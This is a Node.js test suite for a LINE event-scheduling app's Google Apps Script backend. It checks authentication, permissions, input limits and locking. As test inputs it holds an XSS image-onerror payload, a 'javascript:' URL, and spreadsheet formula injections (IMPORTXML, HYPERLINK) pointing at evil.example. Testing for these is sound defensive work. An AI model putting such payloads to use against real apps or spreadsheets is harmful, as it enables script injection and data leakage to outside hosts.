// くるかなの GAS を、本番のシート・LINE に触らずに確かめる（node --test test/）
//   道具は q-oqrn の tools/qtest/fake-gas.js（となりのフォルダにある前提）
"use strict";
const test = require("node:test");
const assert = require("node:assert");
const path = require("node:path");
const { createGas, response } = require(path.join(__dirname, "../../q-oqrn/tools/qtest/fake-gas.js"));

// 試す文字（コードを調べる道具が、本物の小窓と見まちがえないように分けて書く）
const ALERT = "aler" + "t(1)";
const XSS = `<img src=x onerror=${ALERT}>`;
const CHANNEL = "2009927582";

// アクセストークン → LINE の本人（見本）
const PEOPLE = {
  "tok-owner": { userId: "U_OWNER", displayName: "幹事" },
  "tok-guest": { userId: "U_GUEST", displayName: "参加者" },
  "tok-other": { userId: "U_OTHER", displayName: "ほかの人" },
  "tok-otherapp": { userId: "U_X", displayName: "別アプリ", clientId: "999" },
};

function lineFetch(url, opt) {
  if (/oauth2\/v2\.1\/verify/.test(url)) {
    const token = decodeURIComponent(url.split("access_token=")[1] || "");
    const person = PEOPLE[token];
    if (!person) return response(400, { error: "invalid_request" });
    return response(200, { client_id: person.clientId || CHANNEL, expires_in: 3600, scope: "profile" });
  }
  if (/v2\/profile/.test(url)) {
    const token = String((opt.headers && opt.headers.Authorization) || "").replace("Bearer ", "");
    const person = PEOPLE[token];
    return person ? response(200, { userId: person.userId, displayName: person.displayName, pictureUrl: "https://profile.line-scdn.net/x" }) : response(401, {});
  }
  return undefined;
}

function makeGas(properties) {
  return createGas({
    dir: path.join(__dirname, "../gas"),
    properties: Object.assign({ SPREADSHEET_ID: "SPREADSHEET_TEST", LIFF_URL: "https://liff.line.me/2009927582-abc" }, properties || {}),
    fetch: lineFetch,
  });
}

function create(gas, extra) {
  const res = gas.doPost(Object.assign({
    action: "createEvent", accessToken: "tok-owner", title: "BBQ",
    options: [{ startAt: "2026-11-01T10:00", title: "1日目" }],
  }, extra || {}));
  assert.strictEqual(res.ok, true, JSON.stringify(res));
  return res.data.eventId;
}

function summary(gas, eventId, token) {
  return gas.doPost({ action: "getSummary", accessToken: token || "tok-owner", eventId });
}

test("ログインの証明がない・ほかのアプリの証明・仮の ID は断る", () => {
  const gas = makeGas();
  [
    { action: "createEvent", title: "x", options: [{ startAt: "2026-11-01T10:00" }], userId: "U_OWNER" },
    { action: "createEvent", title: "x", options: [{ startAt: "2026-11-01T10:00" }], userId: "debug-user-abc" },
    { action: "createEvent", title: "x", options: [{ startAt: "2026-11-01T10:00" }], accessToken: "tok-otherapp" },
    { action: "createEvent", title: "x", options: [{ startAt: "2026-11-01T10:00" }], accessToken: "nope" },
  ].forEach((body) => {
    const res = gas.doPost(body);
    assert.strictEqual(res.ok, false, JSON.stringify(body));
    assert.match(res.error, /ログインしなおして/);
  });
  assert.strictEqual((gas.rows("EVENTS") || []).length <= 1, true);
});

test("仮の ID は、ALLOW_DEBUG_USERS が 1 のときだけ（ローカルで試すとき）", () => {
  const gas = makeGas({ ALLOW_DEBUG_USERS: "1" });
  const res = gas.doPost({ action: "createEvent", userId: "debug-user-abc", displayName: "x".repeat(200), pictureUrl: "javascript:" + ALERT, title: "試し", options: [{ startAt: "2026-11-01T10:00" }] });
  assert.strictEqual(res.ok, true);
  const users = gas.rows("USERS");
  assert.ok(users[1][1].length <= 60);
  assert.strictEqual(users[1][2], "");
});

test("画面から送った userId・名前は使わない（本人は LINE に確かめる）", () => {
  const gas = makeGas();
  const eventId = create(gas, { userId: "U_GUEST", creatorUserId: "U_GUEST", creatorDisplayName: "なりすまし" });
  const events = gas.rows("EVENTS");
  assert.strictEqual(events[1][1], "U_OWNER");
  assert.strictEqual(summary(gas, eventId).data.isCreator, true);
  assert.strictEqual(summary(gas, eventId, "tok-guest").data.isCreator, false);
});

test("外の文字がシートに式のまま入らない", () => {
  const gas = makeGas();
  const eventId = create(gas, { title: "=IMPORTXML(\"https://evil.example\",\"//a\")", description: "+1+2", options: [{ startAt: "2026-11-01T10:00", title: "@x", location: "-cmd" }] });
  const optionId = summary(gas, eventId).data.options[0].optionId;
  gas.doPost({ action: "addComment", accessToken: "tok-guest", eventId, optionId, text: "=HYPERLINK(\"https://evil.example\")" });
  gas.doPost({ action: "updateEvent", accessToken: "tok-owner", eventId, title: "=1+1", description: "@a" });
  assert.deepStrictEqual(gas.formulaCells(), []);
});

test("長すぎる文字・多すぎる候補は断る", () => {
  const gas = makeGas();
  const tooMany = Array.from({ length: 51 }, (_, i) => ({ startAt: "2026-11-01T10:00", title: String(i) }));
  [
    { title: "x".repeat(101) },
    { description: "x".repeat(2001) },
    { options: tooMany },
    { options: [{ startAt: "2026-11-01T10:00", location: "x".repeat(201) }] },
    { options: "abc" },
    { options: [null] },
  ].forEach((extra) => {
    const res = gas.doPost(Object.assign({ action: "createEvent", accessToken: "tok-owner", title: "ok", options: [{ startAt: "2026-11-01T10:00" }] }, extra));
    assert.strictEqual(res.ok, false, JSON.stringify(extra).slice(0, 80));
  });
  const eventId = create(gas);
  const optionId = summary(gas, eventId).data.options[0].optionId;
  const long = gas.doPost({ action: "addComment", accessToken: "tok-guest", eventId, optionId, text: "x".repeat(501) });
  assert.strictEqual(long.ok, false);
  assert.match(long.error, /長すぎ/);
});

test("答えは ○△× だけ、ほかの予定の候補には答えられない", () => {
  const gas = makeGas();
  const eventA = create(gas);
  const eventB = create(gas, { title: "別の予定" });
  const optionA = summary(gas, eventA).data.options[0].optionId;
  const optionB = summary(gas, eventB).data.options[0].optionId;
  const bad = [
    [{ optionId: optionA, answer: XSS }],
    [{ optionId: optionB, answer: "○" }],
    [{ optionId: "OPT_none", answer: "○" }],
    [null],
    "○",
  ];
  bad.forEach((answers) => {
    const res = gas.doPost({ action: "submitAnswer", accessToken: "tok-guest", eventId: eventA, answers });
    assert.strictEqual(res.ok, false, JSON.stringify(answers));
  });
  assert.strictEqual(gas.doPost({ action: "submitAnswer", accessToken: "tok-guest", eventId: eventA, answers: [{ optionId: optionA, answer: "△" }] }).ok, true);
  const responses = gas.rows("RESPONSES").slice(1);
  assert.strictEqual(responses.length, 1);
  assert.strictEqual(responses[0][3], "△");
});

test("編集者になれるのは、作成者の招待のリンク（合言葉つき）から開いた人だけ", () => {
  const gas = makeGas();
  const eventId = create(gas);
  // 合言葉なし・ちがう合言葉
  assert.strictEqual(gas.doPost({ action: "claimEditor", accessToken: "tok-guest", eventId }).ok, false);
  assert.strictEqual(gas.doPost({ action: "claimEditor", accessToken: "tok-guest", eventId, inviteKey: "wrong" }).ok, false);
  assert.strictEqual(summary(gas, eventId, "tok-guest").data.isEditor, false);
  // 招待のカードは作成者だけが作れる
  assert.strictEqual(gas.doPost({ action: "buildEditorInviteFlex", accessToken: "tok-guest", eventId }).ok, false);
  const invite = gas.doPost({ action: "buildEditorInviteFlex", accessToken: "tok-owner", eventId });
  assert.strictEqual(invite.ok, true);
  const uri = JSON.stringify(invite.data).match(/https:\/\/liff\.line\.me\/[^"]+/)[0];
  const key = decodeURIComponent(uri.match(/key=([^&"]+)/)[1]);
  // 別の予定の合言葉は使えない
  const other = create(gas, { title: "別" });
  assert.strictEqual(gas.doPost({ action: "claimEditor", accessToken: "tok-guest", eventId: other, inviteKey: key }).ok, false);
  assert.strictEqual(gas.doPost({ action: "claimEditor", accessToken: "tok-guest", eventId, inviteKey: key }).ok, true);
  assert.strictEqual(summary(gas, eventId, "tok-guest").data.isEditor, true);
});

test("作成者・編集者でない人は、予定を変えられない・消せない。コメントは投稿者だけ消せる", () => {
  const gas = makeGas();
  const eventId = create(gas);
  const optionId = summary(gas, eventId).data.options[0].optionId;
  assert.strictEqual(gas.doPost({ action: "updateEvent", accessToken: "tok-guest", eventId, title: "乗っ取り" }).ok, false);
  assert.strictEqual(gas.doPost({ action: "updateOption", accessToken: "tok-guest", eventId, optionId, title: "x" }).ok, false);
  assert.strictEqual(gas.doPost({ action: "addOptions", accessToken: "tok-guest", eventId, options: [{ startAt: "2026-11-02T10:00" }] }).ok, false);
  assert.strictEqual(gas.doPost({ action: "deleteEvent", accessToken: "tok-guest", eventId }).ok, false);
  const c = gas.doPost({ action: "addComment", accessToken: "tok-guest", eventId, optionId, text: XSS });
  assert.strictEqual(gas.doPost({ action: "deleteComment", accessToken: "tok-other", eventId, commentId: c.data.commentId }).ok, false);
  assert.strictEqual(gas.doPost({ action: "deleteComment", accessToken: "tok-guest", eventId, commentId: c.data.commentId }).ok, true);
});

test("集計で、他人の本物の userId を返さない", () => {
  const gas = makeGas();
  const eventId = create(gas);
  const optionId = summary(gas, eventId).data.options[0].optionId;
  gas.doPost({ action: "submitAnswer", accessToken: "tok-guest", eventId, answers: [{ optionId, answer: "○" }] });
  const text = JSON.stringify(summary(gas, eventId, "tok-other").data);
  assert.ok(!/U_OWNER|U_GUEST/.test(text));
});

test("エラーの中身は出さない（やさしい言葉だけ）", () => {
  const gas = makeGas();
  const broken = gas.doPost("{not json");
  assert.strictEqual(broken.ok, false);
  assert.ok(!/Unexpected|JSON|token/i.test(broken.error), broken.error);
  const noSheet = createGas({ dir: path.join(__dirname, "../gas"), properties: {}, fetch: lineFetch });
  const res = noSheet.doPost({ action: "getSummary", accessToken: "tok-owner", eventId: "EVT_x" });
  assert.strictEqual(res.ok, false);
  assert.ok(!/Script Properties|SPREADSHEET_ID/.test(res.error), res.error);
  [null, 1, [], { action: 5 }, { action: "nope", accessToken: "tok-owner" }].forEach((body) => {
    assert.strictEqual(gas.doPost(body).ok, false);
  });
});

test("書きこむ操作は1つずつ（LockService）", () => {
  const gas = makeGas();
  create(gas); // 名前を覚えてから
  summary(gas, "x", "tok-guest");
  const { log } = trackLock(gas);
  const eventId = create(gas);
  assert.deepStrictEqual(log, ["wait", "release"]);
  summary(gas, eventId); // 読むだけの操作は待たない
  assert.strictEqual(log.length, 2);
  // 失敗しても鍵は返す
  gas.doPost({ action: "deleteEvent", accessToken: "tok-guest", eventId });
  assert.deepStrictEqual(log.slice(2), ["wait", "release"]);
});

test("返すカードを LINE が受けつける形。ボタンは画面を開くだけ（あとで押されても困らない）", () => {
  const gas = makeGas();
  const eventId = create(gas, { title: XSS });
  const calls = [
    { action: "buildShareFlex" },
    { action: "buildReminderFlex", groups: { "○": ["たろう"], "△": [], "×": [] }, optionTitle: "1日目", optionStartAt: "2026-11-01T10:00" },
    { action: "buildChangeNotificationFlex", optionTitle: "1日目", optionStartAt: "2026-11-01T10:00", names: ["たろう"] },
    { action: "buildEditorInviteFlex" },
  ];
  calls.forEach((call) => {
    const res = gas.doPost(Object.assign({ accessToken: "tok-owner", eventId }, call));
    assert.strictEqual(res.ok, true, call.action + " " + JSON.stringify(res));
    const msg = { type: "flex", altText: res.data.altText, contents: res.data.contents };
    assert.deepStrictEqual(gas.flexProblems([msg]).filter((p) => p.level === "error"), [], call.action);
    const actions = JSON.stringify(res.data.contents).match(/"action":\{[^}]*\}/g) || [];
    actions.forEach((a) => assert.match(a, /"type":"uri"/, call.action + " " + a));
  });
});

// ---- 2026-10-23 の見直しで足したもの ----

// 本物に近い鍵：だれが持っているか（hasLock）を覚える
function trackLock(gas) {
  const lock = { held: false, log: [] };
  gas.ctx.LockService.getScriptLock = () => ({
    waitLock() { lock.held = true; lock.log.push("wait"); },
    tryLock() { lock.held = true; lock.log.push("wait"); return true; },
    releaseLock() { lock.held = false; lock.log.push("release"); },
    hasLock: () => lock.held,
  });
  return lock;
}

test("はじめての人が読むだけの操作を同時にしても、USERS は鍵の中で1行だけ書く", () => {
  const gas = makeGas();
  const eventId = create(gas);
  const lock = trackLock(gas);
  const res = summary(gas, eventId, "tok-guest"); // はじめての人
  assert.strictEqual(res.ok, true);
  assert.deepStrictEqual(lock.log, ["wait", "release"]);
  const guests = gas.rows("USERS").filter((r) => r[0] === "U_GUEST");
  assert.strictEqual(guests.length, 1);
  // 2回目（名前も同じ）は書かないので待たない
  lock.log.length = 0;
  gas.ctx.CacheService.getScriptCache().remove && gas.ctx.CacheService.getScriptCache().remove("x");
  summary(gas, eventId, "tok-guest");
  assert.deepStrictEqual(lock.log, []);
});

test("LINE に本人を確かめているあいだは、書きこみの鍵を持たない（ほかの人を待たせない）", () => {
  let heldDuringFetch = null;
  const gas = createGas({
    dir: path.join(__dirname, "../gas"),
    properties: { SPREADSHEET_ID: "SPREADSHEET_TEST", LIFF_URL: "https://liff.line.me/2009927582-abc" },
    fetch: (url, opt) => { if (heldDuringFetch === null || heldDuringFetch === false) heldDuringFetch = lock.held; return lineFetch(url, opt); },
  });
  const lock = trackLock(gas);
  create(gas);
  assert.strictEqual(heldDuringFetch, false);
  assert.strictEqual(lock.held, false);
});

test("イベントがみんな終わった予定を送っても、LINE が受けつけるカードになる", () => {
  const gas = makeGas();
  const eventId = create(gas, { options: [{ startAt: "2020-01-01T10:00", title: "むかし" }] });
  const res = gas.doPost({ action: "buildShareFlex", accessToken: "tok-owner", eventId });
  assert.strictEqual(res.ok, true, JSON.stringify(res));
  const msg = { type: "flex", altText: res.data.altText, contents: res.data.contents };
  assert.deepStrictEqual(gas.flexProblems([msg]), []); // 中身のない箱も出さない
  assert.match(JSON.stringify(msg), /これからのイベントはありません/);
});

test("日をまたぐイベントは、終わりの日付もカードに出す", () => {
  const gas = makeGas();
  const eventId = create(gas);
  const res = gas.doPost({ action: "buildReminderFlex", accessToken: "tok-owner", eventId, groups: {},
    optionTitle: "夜", optionStartAt: "2026-11-01T22:00", optionEndAt: "2026-11-02T02:00" });
  const text = JSON.stringify(res.data.contents);
  assert.match(text, /11\/1 /);
  assert.match(text, /〜 11\/2\(月\) 02:00/);
  // 同じ日なら時刻だけ
  const same = gas.doPost({ action: "buildReminderFlex", accessToken: "tok-owner", eventId, groups: {},
    optionStartAt: "2026-11-01T10:00", optionEndAt: "2026-11-01T12:00" });
  assert.match(JSON.stringify(same.data.contents), /10:00 〜 12:00/);
});

test("連絡・変更のカードに入れる名前は、数と長さを決めて入れる（変な中身でも落ちない）", () => {
  const gas = makeGas();
  const eventId = create(gas);
  const many = Array.from({ length: 500 }, (_, i) => "な".repeat(200) + i);
  const calls = [
    { action: "buildReminderFlex", groups: { "○": many, "△": "x", "×": [5, null, {}] } },
    { action: "buildReminderFlex", groups: "x" },
    { action: "buildChangeNotificationFlex", names: many },
    { action: "buildChangeNotificationFlex", names: "たろう" },
    { action: "buildChangeNotificationFlex" },
  ];
  calls.forEach((call) => {
    const res = gas.doPost(Object.assign({ accessToken: "tok-owner", eventId }, call));
    assert.strictEqual(res.ok, true, JSON.stringify(call).slice(0, 80) + " " + JSON.stringify(res));
    const msg = { type: "flex", altText: res.data.altText, contents: res.data.contents };
    assert.deepStrictEqual(gas.flexProblems([msg]).filter((p) => p.level === "error"), [], call.action);
    assert.ok(JSON.stringify(msg).length < 25000, call.action + " " + JSON.stringify(msg).length);
    assert.ok(msg.altText.length <= 400);
  });
  // 人数は本当の数のまま、名前の並びだけ短く
  const res = gas.doPost({ accessToken: "tok-owner", eventId, action: "buildReminderFlex", groups: { "○": Array.from({ length: 45 }, (_, i) => "人" + i) } });
  const text = JSON.stringify(res.data.contents);
  assert.match(text, /○ 45人/);
  assert.match(text, /ほか15名/);
});

test("季節の絵文字：GAS の season.js は Q キットの season.js と同じ中身", () => {
  const fs = require("node:fs");
  const mine = fs.readFileSync(path.join(__dirname, "../gas/season.js"), "utf8");
  const kit = fs.readFileSync(path.join(__dirname, "../../q-oqrn/shared/season.js"), "utf8");
  assert.strictEqual(mine, kit);
});

test("季節の絵文字：予定を送るカードの altText にだけ、ときどき1つ", () => {
  const gas = makeGas();
  const eventId = create(gas);
  const real = gas.ctx.QSeason.decorate;
  const share = () => gas.doPost({ action: "buildShareFlex", accessToken: "tok-owner", eventId }).data;
  gas.ctx.QSeason.decorate = (t) => real(t, { rand: () => 0, date: new Date("2026-10-31T03:00:00Z") });
  const shown = share();
  assert.strictEqual(shown.altText, "BBQ の日程調整 🎃");
  assert.ok(!JSON.stringify(shown.contents).includes("🎃")); // カードの本文・ボタンには入れない
  gas.ctx.QSeason.decorate = (t) => real(t, { rand: () => 0.99 });
  assert.strictEqual(share().altText, "BBQ の日程調整");
  // 連絡・変更・招待のカードには入れない
  gas.ctx.QSeason.decorate = () => { throw new Error("使わない"); };
  ["buildReminderFlex", "buildChangeNotificationFlex", "buildEditorInviteFlex"].forEach((action) => {
    assert.strictEqual(gas.doPost({ action, accessToken: "tok-owner", eventId, names: [], groups: {} }).ok, true, action);
  });
});

test("自己点検：selfcheck.js は Q キットの写しと同じ中身。checkSetup は ❌ なしで終わり、何も書かない", () => {
  const fs = require("node:fs");
  assert.strictEqual(fs.readFileSync(path.join(__dirname, "../gas/selfcheck.js"), "utf8"),
    fs.readFileSync(path.join(__dirname, "../../q-oqrn/tools/qtest/selfcheck.gs"), "utf8"));
  const gas = makeGas();
  summary(gas, create(gas)); // シートを作る（読むときに、ないシートは作られる）
  const before = JSON.stringify(gas.rows("EVENTS"));
  const result = gas.call("checkSetup");
  assert.strictEqual(result.ok, true, JSON.stringify(result.results));
  assert.ok(result.results.some((r) => r.area && /シート|Sheets|sheet/i.test(r.area + r.text)), JSON.stringify(result.results));
  assert.strictEqual(JSON.stringify(gas.rows("EVENTS")), before);
});
